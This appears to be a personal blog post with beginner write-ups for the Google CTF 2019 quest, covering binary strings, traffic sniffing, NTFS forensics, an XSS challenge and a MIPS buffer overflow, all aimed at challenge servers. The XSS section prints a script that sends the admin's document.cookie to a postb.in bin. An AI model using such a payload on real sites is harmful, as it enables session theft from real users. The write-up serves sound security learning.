@@ -1,0 +1,202 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1" name=viewport><meta content=#ffffff name=theme-color><meta content=#da532c name=msapplication-TileColor><link crossorigin href=https://cdn.jsdelivr.net/gh/jpswalsh/academicons@1.9.1/css/academicons.min.css integrity=sha384-FIue+PI4SsI9XfHCz8dBLg33b0c1fMJgNU3X//L26FYbGnlSEfWmNT7zgWc2N9b6 rel=stylesheet><link integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.0/css/all.min.css rel=stylesheet><link href=https://amar-laksh.github.io/deep-thought.css rel=stylesheet><title>
+    
+The Codeless Text | Writeups for Google CTF 2019: My first CTF (Kinda) - Part 1
+
+  </title><link crossorigin href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs rel=stylesheet><script crossorigin defer integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js></script><script crossorigin defer integrity=sha384-jiBVvJ8NGGj5n7kJaiWwWp9AjC+Yh8rhZY3GtAX8yU28azcLgoRo4oukO87g7zDT src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/mathtex-script-type.min.js></script><script crossorigin defer integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js></script><body class=has-background-white><nav aria-label="section navigation" class="navbar is-light" role=navigation><div class=container><div class=navbar-brand><a class="navbar-item is-size-5 has-text-weight-bold" href=https://amar-laksh.github.io>The Codeless Text</a><a class="navbar-burger burger" aria-expanded=false aria-label=menu data-target=navMenu role=button> <span aria-hidden=true></span> <span aria-hidden=true></span> <span aria-hidden=true></span> </a></div><div class=navbar-menu id=navMenu><div class="navbar-end has-text-centered"><a class="navbar-item has-text-weight-semibold" href=https://amar-laksh.github.io/> Home </a><a class="navbar-item has-text-weight-semibold" href=https://amar-laksh.github.io/posts> Posts </a><a class="navbar-item has-text-weight-semibold" href=https://amar-laksh.github.io/resume.pdf> Resume </a><a class=navbar-item data-target=#search-modal id=nav-search title=Search> <span class=icon> <i class="fas fa-search"></i> </span> </a><a title="Switch to dark theme" class=navbar-item id=dark-mode> <span class=icon> <i class="fas fa-adjust"></i> </span> </a></div></div></div></nav><section class=section><div class=container><div class=columns><div class="column is-8 is-offset-2"><article class=box><h1 class=title>Writeups for Google CTF 2019: My first CTF (Kinda) - Part 1</h1><p class=subtitle><div class="columns is-multiline is-gapless"><div class="column is-8"><span class="icon-text has-text-grey"> <span class=icon> <i class="fas fa-user"></i> </span> <span>Amar Lakshya published on</span> <span class=icon> <i class="far fa-calendar-alt"></i> </span> <span><time datetime=2019-06-29>June 29, 2019</time></span> </span></div><div class="column is-4 has-text-right-desktop"><span class="icon-text has-text-grey"> <span class=icon> <i class="far fa-clock"></i> </span> <span>9 min,</span> <span class=icon> <i class="fas fa-pencil-alt"></i> </span> <span>1723 words</span> </span></div><div class=column></div><div class="column has-text-right-desktop"></div></div><div class="content mt-2"><p>Here's a list of writeups on the Beginners quest section of the Google CTF 2019. (Why just the quest section? because first CTF requires appropriate expectations of successs):<p><img alt="Beginners Quest Map" src=/images/ctf_images/google_2019/beginners_quest.png><h2 id=enter-spacetime-coordinates-misc>Enter Spacetime Coordinates - Misc</h2><p><img alt=Satellite src=/images/ctf_images/google_2019/spacetime.png><p>You look at the challenge, download the attached document, unzip the downloaded file and find this:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>.
+</span><span>├── 00c2a73eec8abb4afb9c3ef3a161b64b451446910535bfc0cc81c2b04aa132ed
+</span><span>├── log.txt
+</span><span>└── rand2
+</span></code></pre><blockquote><p>Tip: always use the <a rel="noopener nofollow noreferrer" href=https://linux.die.net/man/1/file target=_blank>file</a> command to get an idea of what kind of file you are dealing with.</blockquote><p>Let's give <code>rand2.txt</code> to the <code>file</code> command:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$file rand2
+</span><span>rand2: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0208fc60863053462fb733436cef1ed23cb6c78f, not stripped
+</span></code></pre><p>This seems like a good old <a rel="noopener nofollow noreferrer" href=https://en.wikipedia.org/wiki/Executable_and_Linkable_Format target=_blank>ELF</a> file. Alright, time to make it executable and run it:<blockquote><p>Tip: always try running the exectuable and following the most simple execution path.</blockquote><pre style=color:#c0c5ce;background-color:#2b303b><code><span>$./rand2
+</span><span>Travel coordinator
+</span><span>0: AC+79 3888 - 137584823504239, 43534043465682
+</span><span>1: Pliamas Sos - 253278988691421, 87075501343409
+</span><span>2: Ophiuchus - 83187842604610, 62534244073891
+</span><span>3: Pax Memor -ne4456 Hi Pro - 75701500411216, 204191295118722
+</span><span>4: Camion Gyrin - 10179841572619, 237768916455567
+</span><span>5: CTF - &lt;REDACTED>
+</span><span>
+</span><span>Enter your destination's x coordinate:
+</span><span>>>> 101
+</span><span>Enter your destination's y coordinate:
+</span><span>>>> 201
+</span><span>Arrived somewhere, but not where the flag is. Sorry, try again.
+</span></code></pre><p>So we see that the program requires us to enter coordinates and it also helps us by providing coordinates for things but not our flag which is <strong>redacted!</strong><p>Okay, maybe we can find something interesting in <code>log.txt</code> :<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$cat log.txt
+</span><span>0: AC+79 3888{6652492084280_198129318435598}
+</span><span>1: Pliamas Sos{276116074108949_243544040631356}
+</span><span>2: Ophiuchus{11230026071572_273089684340955}
+</span><span>3: Pax Memor -ne4456 Hi Pro{21455190336714_219250247519817}
+</span><span>4: Camion Gyrin{235962764372832_269519420054142}
+</span></code></pre><p>Well, <code>log.txt</code> doesn't seem very helpful.<p>Now what? we can totally open up <code>radare2</code> or any other cool tool but let's stick to the basics, it's an ELF and contains the flag somewhere inside it.<p>So we run <a rel="noopener nofollow noreferrer" href=https://linux.die.net/man/1/strings target=_blank>strings</a> on our executable:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$strings ./rand2 
+</span><span>/lib64/ld-linux-x86-64.so.2
+</span><span>0SF/
+</span><span>libc.so.6
+</span><span>__isoc99_scanf
+</span><span>puts
+</span><span>time
+</span><span>printf
+</span><span>__cxa_finalize
+</span><span>strcmp
+</span><span>__libc_start_main
+</span><span>...
+</span><span>...
+</span></code></pre><p>Wow, it gives us a giant list of strings. Lets <a rel="noopener nofollow noreferrer" href=https://linux.die.net/man/1/grep target=_blank>grep </a> for something more relatable to our cause:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$strings ./rand2  | grep flag
+</span><span>Arrived at the flag. Congrats, your flag is: CTF{welcome_to_googlectf}
+</span><span>Arrived somewhere, but not where the flag is. Sorry, try again.
+</span></code></pre><p>And there we go folks, found our first flag!<p><strong>Lesson learned:</strong> <a rel="noopener nofollow noreferrer" href=https://en.wikipedia.org/wiki/KISS_principle target=_blank>Keep it simple, stupid</a><h2 id=satellite-networking>Satellite - networking</h2><p><img alt=Satellite src=/images/ctf_images/google_2019/satellite.png><p>Let's take a cue from our previous challenge and download, unzip and inspect the files in the attachment:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>.
+</span><span>├── 768be4f10429f613eb27fa3e3937fe21c7581bdca97d6909e070ab6f7dbf2fbf
+</span><span>├── init_sat
+</span><span>└── README.pdf
+</span></code></pre><p>Having a look at the <code>init_sat</code> file with our <code>file</code> command, we learn it's an ELF built with <a rel="noopener nofollow noreferrer" href=https://golang.org/ target=_blank>Go</a> and so can't really be debugged with <a rel="noopener nofollow noreferrer" href=https://en.wikipedia.org/wiki/GNU_Debugger target=_blank>Gdb</a>. Well, we can still open up the accompanying <code>README.pdf</code>: <img alt=README.pdf src=/images/ctf_images/google_2019/sat_README.png><p>There are a couple of hints here:<blockquote><p>communication, read the space-static, set up the satellites and satellite name "Osmium"</blockquote><p>Alrighty, let's not muck about with what <code>init_sat</code> may do and let's just execute it!<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$./init_sat
+</span><span>Hello Operator. Ready to connect to a satellite?
+</span><span>Enter the name of the satellite to connect to or 'exit' to quit
+</span><span>osmium
+</span><span>Establishing secure connection to osmium
+</span><span> satellite...
+</span><span>Welcome. Enter (a) to display config data, (b) to erase all data or (c) to disconnect
+</span><span>
+</span><span>a
+</span><span>Username: brewtoot password: ********************       
+</span><span>166.00 IS-19 2019/05/09 00:00:00        Swath 640km      Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m        
+</span><span>167.Daily acquisition capacity: 220,000km²   
+</span><span>Remaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E
+</span></code></pre><p>So we can see that our <code>init_sat</code> connects to a server to provide us with options. Selecting the <code>a</code> option, we are given a URL to a google docs sheet: <img alt="Google Docs Sheet" src=/images/ctf_images/google_2019/sat_config_data.png><p>Hmm, that looks like an interesting pattern of text, especially with the string ending in a couple of <em>"="</em>. Sure enough, if we squint at it for a long time, we can see that this is a <a rel="noopener nofollow noreferrer" href=https://en.wikipedia.org/wiki/Base64 target=_blank>base64-encoded</a> string. So using the <a rel="noopener nofollow noreferrer" href=https://linux.die.net/man/1/base64 target=_blank>base64</a> program, we can decode the text:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$echo "VXNlcm5hbWU6IHdpcmVzaGFyay1yb2NrcwpQYXNzd29yZDogc3RhcnQtc25pZmZpbmchCg==" | base64 -d
+</span><span>Username: wireshark-rocks
+</span><span>Password: start-sniffing!
+</span></code></pre><p>So the hint is obvious at this point, We need to start sniffing the connection between the <code>init_sat</code> and the server!<p>To do this, we simply fire up <a rel="noopener nofollow noreferrer" href=https://wiki.wireshark.org/ target=_blank>Wireshark</a> or any other sniffing tool (even the simple <a rel="noopener nofollow noreferrer" href=https://linux.die.net/man/8/tcpdump target=_blank>tcpdump</a> could do the job!) and keeping our sniffing tool open we execute our target file, <code>init_sat</code> in this case and just observe the traffic!<p><img alt="Wirehsark packet" src=/images/ctf_images/google_2019/sat_wire.png><p>Brushing aside all the unrelated (and also sensitive) captured packets, we get this DNS query to the sub-domain of <code>satellite.ctfcompetition.com</code>!<p>Now the first step after finding our server is to port scan it with nmap but after a couple of minutes it was clear that all the ports are either closed or filtered :(<p>Well, we know that our executable connects to this sub-domain and we know that address is sure to be inside our executable, putting these two facts together, we should probably welcome back our old friend <code>strings</code> and search of some more context with our newly acquired sub-domain!<pre>
+$strings ./init_sat  | grep  "satellite.ctfcompetition.com"
+...
+...
+...type offset out of range<b>satellite.ctfcompetition.com:1337</b>stackalloc ...
+...
+</pre><p>Here we go! it's the old <a href="https://www.speedguide.net/port.php?port=1337" rel="noopener nofollow noreferrer" target=_blank>port 1337</a> that's being used to connect to our server.<p>Now let's do the most simple thing first, connect to our server on port 1337:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$nc satellite.ctfcompetition.com 1337
+</span><span>Welcome. Enter (a) to display config data, (b) to erase all data or (c) to disconnect
+</span><span>
+</span><span>a
+</span><span>Username: brewtoot password: CTF{4efcc72090af28fd33a2118985541f92e793477f}      166.00 IS-19 2019/05/09 00:00:00 Swath 640km     Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m Daily acquisition capacity: 220,000km²  Remaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E
+</span></code></pre><p>And there we have our second flag!<p><strong>Lesson learned:</strong> Keep a list of everything at hand! (<a rel="noopener nofollow noreferrer" href=https://github.com/JohnHammond/ctf-katana target=_blank>Here's a good one</a>)<h2 id=1st-choice>1st Choice!</h2><p>Submitting the second flag, we come to the first choice between two routes in the quest: <img alt=1st_choice src=/images/ctf_images/google_2019/1st_choice.png><p>Let's take the <code>Home</code> route first!<h2 id=home-computer-forensics>Home Computer - Forensics</h2><p><img alt=home_computer.png src=/images/ctf_images/google_2019/home_computer.png><p>Again downloading and unzipping the attachments we some files:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>.
+</span><span>├── 86863db246859897dda6ba3a4f5801de9109d63c9b6b69810ec4182bf44c9b75
+</span><span>├── family.ntfs
+</span><span>└── note.txt
+</span></code></pre><p>The <code>note.txt</code> just seems to tell us to rename <code>family.ntfs</code> to <code>family.dmg</code> if we are on MacOS, so let's just jump straight to our <a rel="noopener nofollow noreferrer" href=https://en.wikipedia.org/wiki/NTFS target=_blank>ntfs</a> file and <a rel="noopener nofollow noreferrer" href=https://linux.die.net/man/8/mount target=_blank>mount</a> it on a mount point under <code>/mnt</code> by running:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>sudo mount -t ntfs family.ntfs  /mnt
+</span></code></pre><p>and now let's see the files inside mount:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>.
+</span><span>├── bootmgr
+</span><span>├── BOOTNXT
+</span><span>├── pagefile.sys
+</span><span>├── Program Files
+</span><span>├── Program Files (x86)
+</span><span>├── Setup.log
+</span><span>├── SSUUpdater.log
+</span><span>├── swapfile.sys
+</span><span>├── Users
+</span><span>└── Windows
+</span></code></pre><p>This clearly looks like your average Windows <code>C:/</code> directory partition. Let's prod around a little in the file structure to find something interesting.<blockquote><p>Tip: The Users directory contains all the documents and downloads by the user so that should always be checked first.</blockquote><p>Looking around for a while, we find something interesting in <code>/mnt/Users/Family/Documents</code>:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>.
+</span><span>├── credentials.txt
+</span><span>├── document.pdf
+</span><span>└── preview.pdf
+</span></code></pre><p>The output of <code>credentials.txt</code>:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>I keep pictures of my credentials in extended attributes.
+</span></code></pre><p>Alright, go and have a look at what <a rel="noopener nofollow noreferrer" href=https://en.wikipedia.org/wiki/Extended_file_attributes target=_blank>extended attributes</a> are.<p>Now, let's use the <a rel="noopener nofollow noreferrer" href=https://linux.die.net/man/5/attr target=_blank>attr</a> program to list out extended attributes of our <code>credentials.txt</code> file:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$attr -l credentials.txt
+</span><span>Attribute "FILE0" has a 38202 byte value for credentials.txt
+</span></code></pre><p>Okay let's get the value of the key <code>FILE0</code>:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$attr -g FILE0 credentials.txt
+</span><span>...
+</span></code></pre><p>This spills out a heck lot of strange characters, okay time to redirect all this output to a file:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$attr -g FILE0 credentials.txt > cred
+</span></code></pre><p>Now we need to find out what type of data this is (although we have been given a clear hint in the <code>credentials.txt</code> file that this should be a picture, let's be specific) and in order to do let's use the following basic information:<ol><li>if it's a specific file format, it will have a specific header or file signature (mostly it's in the form of a specific header)<li>if we can see the header of the file format, we can understand what type of file it is.</ol><p>Now taking into account these two things, let's try to output first few bytes of our file <code>cred</code> with the aid of the <a rel="noopener nofollow noreferrer" href=https://linux.die.net/man/1/head target=_blank>head</a> and <a rel="noopener nofollow noreferrer" href=https://linux.die.net/man/1/hexdump target=_blank>hexdump</a> programs:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$cat cred | head -c 128 | hexdump -C
+</span><span>00000000  41 74 74 72 69 62 75 74  65 20 22 46 49 4c 45 30  |Attribute "FILE0|
+</span><span>00000010  22 20 68 61 64 20 61 20  33 38 32 30 32 20 62 79  |" had a 38202 by|
+</span><span>00000020  74 65 20 76 61 6c 75 65  20 66 6f 72 20 63 72 65  |te value for cre|
+</span><span>00000030  64 65 6e 74 69 61 6c 73  2e 74 78 74 3a 0a 89 50  |dentials.txt:..P|
+</span><span>00000040  4e 47 0d 0a 1a 0a 00 00  00 0d 49 48 44 52 00 00  |NG........IHDR..|
+</span><span>00000050  04 d2 00 00 01 53 08 02  00 00 00 73 b9 b6 5e 00  |.....S.....s..^.|
+</span><span>00000060  00 00 03 73 42 49 54 08  08 08 db e1 4f e0 00 00  |...sBIT.....O...|
+</span><span>00000070  00 19 74 45 58 74 53 6f  66 74 77 61 72 65 00 67  |..tEXtSoftware.g|
+</span><span>00000080
+</span></code></pre><p>We can clearly see error message and after that a mention of <code>PNG</code>. Looking at the <a rel="noopener nofollow noreferrer" href=https://en.wikipedia.org/wiki/Portable_Network_Graphics target=_blank>PNG File Format</a>, we realise that this header is a bit off and needs to be edited to start with the regular 8-byte signature - <code>89 50 4E 47 0D 0A 1A 0A</code>.<p>So using any kind of hex editor just delete the message upto the byte <code>89</code> and save the file. Now since we know this is <em>.png</em> file, let's open it with any image viewer: <img alt=Home_cred.png src=/images/ctf_images/google_2019/home_cred.png><p>And there we go, got our Flag!<p><strong>Lesson Learned:</strong> always remember to extract file signature when dealing with unknown files formats (<a rel="noopener nofollow noreferrer" href=http://file-extension.net/seeker/ target=_blank>Here's a search tool</a>)<h2 id=government-agricultural-network-web>Government Agricultural Network - Web</h2><p><img alt=government.png src=/images/ctf_images/google_2019/government.png><p>Alright we go to the given url to find a textbox with which we can apparently create a new post: <img alt=government_site.png src=/images/ctf_images/google_2019/government_site.png><p>Trying some random text we and hitting the submit button we are led to this page: <img alt=government_post.png src=/images/ctf_images/google_2019/government_post.png><p>Also this inspecting the request in developer tools we can see it's a <code>post</code> request: <img alt=government_method.png src=/images/ctf_images/google_2019/government_method.png><p>Nothing much to see except the message tells us the admin will review the post shortly. This means that we can send data to the <code>admin</code> through this method and it will be evaluated, seems like a perfect ground for a <a rel="noopener nofollow noreferrer" href=https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) target=_blank>Cross Site Scripting (XSS) attack</a>!<blockquote><p>Tip: https://www.owasp.org is an excellent resource to learn about various exploitation techniques!</blockquote><p>Okay let's use the help of <a rel="noopener nofollow noreferrer" href=https://postb.in/ target=_blank>PostBin</a> to get output of our payload and create a new bin: <img alt=government_bin.png src=/images/ctf_images/google_2019/government_bin.png><p>Now let's create our payload to send to the <code>admin</code><pre style=color:#c0c5ce;background-color:#2b303b><code><span>&lt;script>
+</span><span> location.href = 'https://postb.in/1561983861427-6059538838453?cookie='+document.cookie;
+</span><span>&lt;/script>
+</span></code></pre><p>When the <code>admin</code> reviews the post it gets directed to the bin of our choice with all the precious cookies that might contain some relevant information for us!<p>After posting our payload, let's see the output in our bin: <img alt=government_flag.png src=/images/ctf_images/google_2019/government_flag.png><p>Well, looks like we got our Flag in some tasty cookies!<p><strong>Lesson Learned:</strong> Always consult <a rel="noopener nofollow noreferrer" href=https://www.owasp.org/ target=_blank>OWASP</a>.<h2 id=stop-gan-pwn>Stop GAN - Pwn</h2><p><img alt=stop_gan.png src=/images/ctf_images/google_2019/stop_gan.png><p>Again downloading and unzipping we have:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>.
+</span><span>├── 4a8becb637ed2b45e247d482ea9df123eb01115fc33583c2fa0e4a69b760af4a
+</span><span>├── bof
+</span><span>└── console.c
+</span></code></pre><p>Let's have a look at the binary first:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$./bof
+</span><span>Cauliflower systems never crash >>
+</span><span>a
+</span></code></pre><p>And we input <code>a</code> and it just cleanly exists. Okay there are a couple of hints: the never crash message, the filename <code>bof</code> as in buffer overflow so we have an idea that we need to overflow it.<blockquote><p>Tip: Always use checksec and file commands in a pwn challenge to understand the binary vulnerabilities present.</blockquote><p>Taking cue, we run a quick <a rel="noopener nofollow noreferrer" href=https://github.com/slimm609/checksec.sh target=_blank>checksec</a> on the binary and we get:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$checksec -f ./bof
+</span><span>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
+</span><span>No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   1817 Symbols     Yes    0               41      ./bof
+</span></code></pre><p>Also let's just run <code>file</code> to any more info:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$file bof
+</span><span>bof: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a31c48679f10dc6945e7b5e3a88b979bebe752e3, not stripped
+</span></code></pre><p>So we don't have neither <a rel="noopener nofollow noreferrer" href=https://ctf101.org/binary-exploitation/stack-canaries/ target=_blank>stack canary</a> nor <a rel="noopener nofollow noreferrer" href=https://ctf101.org/binary-exploitation/no-execute/ target=_blank>NX</a> to deal with, so not much to worry about this seems like a simple buffer-overflow situation. One important thing to note is that elf is a mips executable and is little endian architecture. So we won't be able to use our out of the box gdb for debugging purposes.<p>Let's take a look at the other c source code file now:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>#include </span><span>&lt;</span><span style=color:#a3be8c>stdio.h</span><span>>
+</span><span style=color:#b48ead>#include </span><span>&lt;</span><span style=color:#a3be8c>stdlib.h</span><span>>
+</span><span style=color:#b48ead>#include </span><span>&lt;</span><span style=color:#a3be8c>string.h</span><span>>
+</span><span style=color:#b48ead>#include </span><span>&lt;</span><span style=color:#a3be8c>unistd.h</span><span>>
+</span><span>
+</span><span style=color:#65737e>/**
+</span><span style=color:#65737e> * 6e: bufferflow triggering segfault  - binary, compile with:
+</span><span style=color:#65737e> * gcc /tmp/console.c -o /tmp/console -static -s
+</span><span style=color:#65737e> *
+</span><span style=color:#65737e> * Console allows the player to get info on the binary.
+</span><span style=color:#65737e> * Crashing bof will trigger the 1st flag.
+</span><span style=color:#65737e> * Controlling the buffer overflow in bof will trigger the 2nd flag.
+</span><span style=color:#65737e> */
+</span><span>
+</span><span style=color:#b48ead>int </span><span style=color:#8fa1b3>main</span><span>() {
+</span><span>  </span><span style=color:#96b5b4>setbuf</span><span>(stdin, </span><span style=color:#d08770>NULL</span><span>);
+</span><span>  </span><span style=color:#96b5b4>setbuf</span><span>(stdout, </span><span style=color:#d08770>NULL</span><span>);
+</span><span>  </span><span style=color:#96b5b4>setbuf</span><span>(stderr, </span><span style=color:#d08770>NULL</span><span>);
+</span><span>  </span><span style=color:#b48ead>char</span><span> inputs[</span><span style=color:#d08770>256</span><span>];
+</span><span>  </span><span style=color:#96b5b4>printf</span><span>("</span><span style=color:#a3be8c>Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.</span><span style=color:#96b5b4>\n</span><span style=color:#a3be8c> Bonus flag for controlling the crash.</span><span style=color:#96b5b4>\n</span><span>");
+</span><span>  </span><span style=color:#b48ead>while</span><span>(</span><span style=color:#d08770>1</span><span>) {
+</span><span>    </span><span style=color:#96b5b4>printf</span><span>("</span><span style=color:#96b5b4>\n</span><span style=color:#a3be8c>Console commands: </span><span style=color:#96b5b4>\n</span><span style=color:#a3be8c>run</span><span style=color:#96b5b4>\n</span><span style=color:#a3be8c>quit</span><span style=color:#96b5b4>\n</span><span style=color:#a3be8c>>></span><span>");
+</span><span>    </span><span style=color:#b48ead>if </span><span>(</span><span style=color:#96b5b4>fgets</span><span>(inputs, </span><span style=color:#d08770>256</span><span>, stdin) == </span><span style=color:#d08770>NULL</span><span>) {
+</span><span>      </span><span style=color:#96b5b4>exit</span><span>(</span><span style=color:#d08770>0</span><span>);
+</span><span>    }
+</span><span>    </span><span style=color:#96b5b4>printf</span><span>("</span><span style=color:#a3be8c>Inputs: </span><span style=color:#d08770>%s</span><span>", inputs);
+</span><span>    </span><span style=color:#b48ead>if </span><span>( </span><span style=color:#96b5b4>strncmp</span><span>(inputs, "</span><span style=color:#a3be8c>run</span><span style=color:#96b5b4>\n\0</span><span>", </span><span style=color:#d08770>256</span><span>) == </span><span style=color:#d08770>0 </span><span>) {
+</span><span>      </span><span style=color:#b48ead>int</span><span> result = </span><span style=color:#96b5b4>system</span><span>("</span><span style=color:#a3be8c>/usr/bin/qemu-mipsel-static ./bof</span><span>");
+</span><span>      </span><span style=color:#b48ead>continue</span><span>;
+</span><span>    } </span><span style=color:#b48ead>else if </span><span>( </span><span style=color:#96b5b4>strncmp</span><span>(inputs, "</span><span style=color:#a3be8c>quit</span><span style=color:#96b5b4>\n\0</span><span>", </span><span style=color:#d08770>256</span><span>) == </span><span style=color:#d08770>0 </span><span>) {
+</span><span>      </span><span style=color:#96b5b4>exit</span><span>(</span><span style=color:#d08770>0</span><span>);
+</span><span>    } </span><span style=color:#b48ead>else </span><span>{
+</span><span>      </span><span style=color:#96b5b4>puts</span><span>("</span><span style=color:#a3be8c>Unable to determine action from your input</span><span>");
+</span><span>      </span><span style=color:#96b5b4>exit</span><span>(</span><span style=color:#d08770>0</span><span>);
+</span><span>    }
+</span><span>  }
+</span><span>  </span><span style=color:#b48ead>return </span><span style=color:#d08770>0</span><span>;
+</span><span>}
+</span></code></pre><p>Well by reading the comments in the program it's clear what we need to do, let's compile the program first and run it:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>./console
+</span><span>Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
+</span><span> Bonus flag for controlling the crash.
+</span><span>
+</span><span>Console commands:
+</span><span>run
+</span><span>quit
+</span><span>>>
+</span></code></pre><p>The <code>run</code> command runs the <code>bof</code> binary and then expects us to overflow it.<p>Let's try crashing the program by manually entering a lot of input and see what happens:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$./console
+</span><span>Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
+</span><span> Bonus flag for controlling the crash.
+</span><span>
+</span><span>Console commands:
+</span><span>run
+</span><span>quit
+</span><span>>>run
+</span><span>Inputs: run
+</span><span>Cauliflower systems never crash >>
+</span><span>ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
+</span><span>segfault detected! ***CRASH***could not open flag
+</span></code></pre><p>This clearly crashes the program! So let's try the same thing on official server but with a little help from python to automate our input:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$python2 -c "print 'run';print 'A'*999" | nc buffer-overflow.ctfcompetition.com 1337
+</span><span>Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
+</span><span> Bonus flag for controlling the crash.
+</span><span>
+</span><span>Console commands:
+</span><span>run
+</span><span>quit
+</span><span>>>Inputs: run
+</span><span>CTF{Why_does_cauliflower_threaten_us}
+</span><span>Cauliflower systems never crash >>
+</span><span>segfault detected! ***CRASH***
+</span><span>Console commands:
+</span><span>run
+</span><span>quit
+</span><span>>>
+</span></code></pre><p>Here we got the next flag! So doing this we finally come to the end of this route that we had taken. Let's go back to the other route now in the <a href=/posts/google-ctf-writeups-part-2/>next part</a>!</div></article></div></div></div></section><section class=modal id=search-modal><div class=modal-background></div><div class=modal-card><header class=modal-card-head><p class=modal-card-title>Search</header><section class=modal-card-body><div class="field mb-2"><div class=control><input placeholder="Search this website." class=input id=search type=search></div></div><div class=search-results><div class=search-results__items></div></div></section></div><button class="modal-close is-large" aria-label=close></button></section><section class=section><div class=container><div class="columns is-centered"><div class="column is-8"><nav class=level><div class="level-item has-text-centered"><a class="button is-black is-outlined" href=https://amar-laksh.github.io/posts/google-ctf-writeups-part-2/> <span class="icon mr-2"> <i class="fas fa-arrow-circle-left"></i> </span> Writeups for Google CTF 2019: My first CTF (Kinda) - Part 2 </a></div><div class="level-item has-text-centered"><a class="button is-black is-outlined" href=https://amar-laksh.github.io/posts/setting-up-kali-docker-for-hackthebox/> Setting up a Kali docker container for HackTheBox and other stuff.<span class="icon ml-2"> <i class="fas fa-arrow-circle-right"></i> </span> </a></div></nav></div></div></div></section><footer class="footer py-4"><div class="content has-text-centered"><p>Built with <span class=icon-text> <span class=icon> <i class="fas fa-code"></i> </span> <span>code</span> </span> and <span class=icon-text> <span class=icon> <i class="fas fa-heart"></i> </span> <span>love</span> </span><p>Powered by <span class=icon-text> <span class=icon> <i class="fas fa-power-off"></i> </span> <span>zola</span> </span></div></footer><script src=https://amar-laksh.github.io/elasticlunr.min.js></script><script src=https://amar-laksh.github.io/search_index.en.js></script><script src=https://amar-laksh.github.io/js/site.js></script>
